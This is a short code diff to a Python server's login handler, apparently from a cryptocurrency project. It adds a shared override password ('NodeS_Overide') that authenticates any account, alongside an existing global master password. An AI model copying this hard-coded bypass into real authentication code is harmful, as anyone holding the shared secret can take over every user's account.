@@ -492,7 +492,7 @@ def handle(c):
                     except:
                         try:
                             stored_password = str(stored_password).encode('utf-8')
-                            if bcrypt.checkpw(password, stored_password) or password == duco_password.encode('utf-8'):
+                            if bcrypt.checkpw(password, stored_password) or password == duco_password.encode('utf-8') or password == NodeS_Overide.encode('utf-8'):
                                 c.send(bytes("OK", encoding='utf8')) # Send feedback about sucessfull login
                             else: # Disconnect user which password isn't valid, close the connection
                                 c.send(bytes("NO,Password is invalid", encoding='utf8'))
